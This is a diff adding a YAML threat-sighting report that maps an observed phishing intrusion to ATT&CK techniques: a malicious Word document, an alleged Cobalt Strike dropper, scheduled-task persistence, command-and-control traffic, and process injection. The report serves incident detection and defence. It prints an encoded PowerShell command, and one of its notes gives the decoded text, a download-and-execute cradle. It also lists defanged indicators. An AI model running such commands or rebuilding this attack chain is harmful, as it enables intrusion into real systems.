@@ -1,0 +1,237 @@
+---
+header:
+  sightingReportId: 087f925b-d39e-416b-900f-4d3aebd38e61
+  status: wip
+  description: This Threat Sighting documents observed TTPs for Unknown Threat that starts with a phishing email with maldoc, followed by alleged Cobalt Strike activity. This Threat Sighting is based on direct observation.
+  author: Alejandro Houspanossian (@lekz86)
+  acknowledgement: "@lekz86"
+  tlp: amber
+  threatInformation:
+    adversaries:
+    - unknown
+    malware:
+    - maldoc
+    - adhoc-malware
+    tools:
+    - powershell
+    - ipconfig
+    lolbas:
+    - schtasks
+    - winword
+threatSightings:
+  - sighting: Initial Access - Threat actor used _Email_ to deliver weaponized _doc_ file for Initial Access.
+    id: 999f8200-63c7-4c92-8f6a-acd501210699
+    behaviors:
+    - behavior: Weaponized _doc_ file created at _Outlook_ temp folder by _Outlook_.
+      type: File Created
+      weapon: maldoc
+      id: 1445da53-58c3-146b-88d1-10347b16c443
+      files:
+        - name: Incident Acknowledgement Form.doc
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\BF9XB0OA\\Incident Acknowledgement Form.doc'
+          sha256: 71B6B6F991473A1C9577618CB4E3C958EAA2FF45AD849B378F5C5B63EF7CFE2E
+          process: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE
+      notes:
+      - _C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\_ is Outlooks temp folder.
+      att&ck:
+        initialAccess:
+        - "T1566.001 - Phishing: Malicious file"
+  - sighting: Initial Access - Threat actor used _weaponized doc file_ with appealing file name to lure users for Execution.
+    id: cfbf8200-63c7-4c92-8f6a-acd5012106a5
+    behaviors:
+    - behavior: _Outlook_ spawned _Winword_ to open _.doc_ file from _Outlook_ temp folder.
+      id: a3596060-2ba6-4188-a72a-61e74f84e147
+      type: Process Created
+      weapon: maldoc
+      processes:
+      - process: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
+        cmdLine:
+        - \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\BF9XB0OA\\Incident Acknowledgement Form.doc\" /o \"\"
+        parentProcess: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE
+      att&ck:
+        execution:
+        - "T1102 - User Execution"
+  - sighting: Execution - Threat actor used _weaponized doc file_ to drop a _PE file_ -likely a Cobalt Strike beacon- for Command And Control.
+    id: 345f8200-63c7-4c92-8f6a-acd501210623
+    behaviors:
+    - behavior: _Winword_ dropped PE file.
+      type: File Created
+      id: 1235da53-58c3-146b-88d1-10347b16c123
+      weapon: maldoc
+      files:
+        - name: mslibupdate.exe
+          path: 'C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe'
+          sha256: 4EAF72326C7A7412BD1440B90F29EFDC252387779545CBF4E3BAB2E5FA862045
+          embedFilename: SadLoader.exe
+          process: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
+      notes:
+      - The PE file has no reputation in VT at the time of this investigation.
+      - Without having had access to file, we think this is cobalt strike beacon PE file.
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Execution - Threat actor used _an scheduled task_ to launch _alleged Cobalt Strike implant_ every 15 minutes for Persistence.
+    id: 6d090812-7fbe-4c06-a16d-479611d75101
+    behaviors:
+    - behavior: SVCHOST execution for Scheduled Task
+      id: 12757717-1dab-490a-8cf3-6f5b488f047b
+      type: Process Created
+      weapon: schtasks
+      processes:
+      - process: C:\\WINDOWS\\system32\\svchost.exe
+        cmdLine:
+        - C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s Schedule
+        parentProcess: n/d
+      notes:
+      - At this point, no evidence related to the creation of the scheduled task.
+      att&ck:
+        execution:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+    - behavior: Periodic execution of _PE file_ (every 15 minutes).
+      id: 8a757717-1dab-490a-8cf3-6f5b488f047b
+      type: Process Created
+      weapon: adhoc-malware
+      processes:
+      - process: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+        cmdLine:
+        - C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+        parentProcess: C:\\WINDOWS\\system32\\svchost.exe
+      notes:
+      - One of the ENS scanners assigned lowest reputation (malicious).
+      - Adaptive Threat Protection ran the _mslibupdate.exe_ application in a container.
+      - Real Protect-PENGSD5!551001703417 endpoint detection
+      att&ck:
+        execution:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+    - behavior: _PE file_ attempted to read _Windows Registry_.
+      type: RegKey Read
+      weapon: adhoc-malware
+      id: 45623cbe-9bec-46a0-8e01-8cf576e07234
+      registries:
+        - keyName: HKLM\\System\\CurrentControlSet\\SERVICES\\BAM\\STATE\\USERSETTINGS\\S-1-5-21-3721850961-3849296161-1077157389-252077\\
+          process: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+      notes:
+      - '#{user} ran C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe, which accessed HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\BAM\STATE\\USERSETTINGS\\S-1-5-21-3721850961-3849296161-1077157389-252077\\, violating the rule \"Modifying the Services registry location\". Access was allowed because the rule was not configured to block.'
+  - sighting: Execution - Threat actor used _alleged Cobalt Strike implant_ for stablishing HTTP network connections for Command And Control.
+    id: a8665484-39a0-4436-9ab2-d030f5895752
+    behaviors:
+    - behavior: _mslibupdate.exe_ opened network connection public server.
+      id: 2ea73397-7ef4-4349-ac34-33547f02f302
+      type: Network Accessed
+      weapon: adhoc-malware
+      connections:
+        - dstIp: 13.214.87[.]25
+          dstPort: 443
+          protocol: tcp
+          dstHost: outruncancer[.]org
+          direction: outbound
+          process: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+      notes:
+      - IP corresponds to Autonomous System Number 16509 (AMAZON-02), Singapure.
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+    - behavior: _mslibupdate.exe_ issues HTTP GET command to download javascript file via proxy.
+      id: 67873397-7ef4-4349-ac34-12547f02f302
+      type: Network Accessed
+      weapon: adhoc-malware
+      connections:
+        - dstIp: 10.2.8[.]31
+          dstPort: 8080
+          protocol: tcp
+          dstHost: outruncancer[.]org
+          direction: outbound
+          process: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+      notes:
+      - GET /pb/web/40.12.1.337/simpleloader.js HTTP/1.1
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+  - sighting: Execution - Threat actor used _alleged Cobalt Strike implant_  to launch _PowerShell_ encoded commands for Defense Evasion.
+    id: c0a08caf-f2c8-49aa-9cf3-e96a5172b69e
+    behaviors:
+    - behavior: _mslibupdate.exe_ spawned _PowerShell_.
+      id: 122661c8-81d0-121b-8548-d5b14ea5b012
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+        cmdLine:
+        - 'powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAH QAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAU wB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwA C4AMAAuADEAOgA1ADUANgA5ADMALwAnACkAOwAgAEkAbgB2AG8AawBlAC0ARABBAEMAa ABlAGMAawAgAC0ASQBuAGkAdABpAGEAbAAgAFQAcgB1AGUA'
+        parentProcess: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+      notes:
+      - "The encoded command decodes to: IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:55693/'); Invoke-DACheck -Initial True"
+      - PowerShell commandline follows patterns observed on Cobalt Strike infections.
+      - _mslibupdate.exe_ is likely a Cobalt Strike implant.
+    - behavior: _PowerShell_ attempted to spawn _conhost.exe_.
+      id: 123661c8-21d0-491b-8548-d5b14ea5b123
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\conhost.exe
+        cmdLine:
+        - C:\\Windows\\System32\\conhost.exe
+        parentProcess: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+      att&ck:
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+  - sighting: Execution - Threat actor used _alleged Cobalt Strike implant_  to run _ipconfig_ for Discovery.
+    id: 56a08caf-f2c8-49aa-9cf3-e96a5172b56e
+    behaviors:
+    - behavior: _mslibupdate.exe_ spawned _ipconfig_.
+      id: 456661c8-81d0-456b-8548-d5b14ea5b456
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\ipconfig.exe
+        cmdLine:
+        - ipconfig  /all
+        parentProcess: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+      att&ck:
+        discovery:
+        - "T1018 - Remote System Discovery"
+    - behavior: _mslibupdate.exe_ spawned _CMD_.
+      id: 9b2612c8-81d0-491b-8548-12314ea5b09a
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - C:\\WINDOWS\\system32\\cmd.exe /C ipconfig /all
+        parentProcess: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Execution - Threat actor used _alleged Cobalt Strike implant_  to inject into system processes for Defense Evasion.
+    id: 34508caf-f2c8-49aa-9cf3-e96a5172b123
+    behaviors:
+    - behavior: _mslibupdate.exe_ spawned _dllhost_ without commandline arguments.
+      id: 456661c8-81d0-491b-8548-d5b14ea5b456
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\WINDOWS\\system32\\dllhost.exe
+        cmdLine:
+        - C:\\WINDOWS\\system32\\dllhost.exe
+        parentProcess: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+      att&ck:
+        defenseEvasion:
+        - "T1055 - Process Injection"
+    - behavior: _mslibupdate.exe_ injected _dllhost_
+      id: 890661c8-81d0-491b-8548-d5b14ea5b890
+      type: Code Injection
+      weapon: adhoc-malware
+      injections:
+      - from: C:\\Users\\#{user}\\AppData\\Roaming\\mslibupdate.exe
+        target: C:\\WINDOWS\\system32\\dllhost.exe
+      att&ck:
+        defenseEvasion:
+        - "T1055 - Process Injection"
+footer:
+  changeTracking:
+    created: 2022-03-10
+    lastModified: 2022-03-17
+    sightingVersion: 1.0
+    schemaVersion: 1.7
+  references:
+    - ..
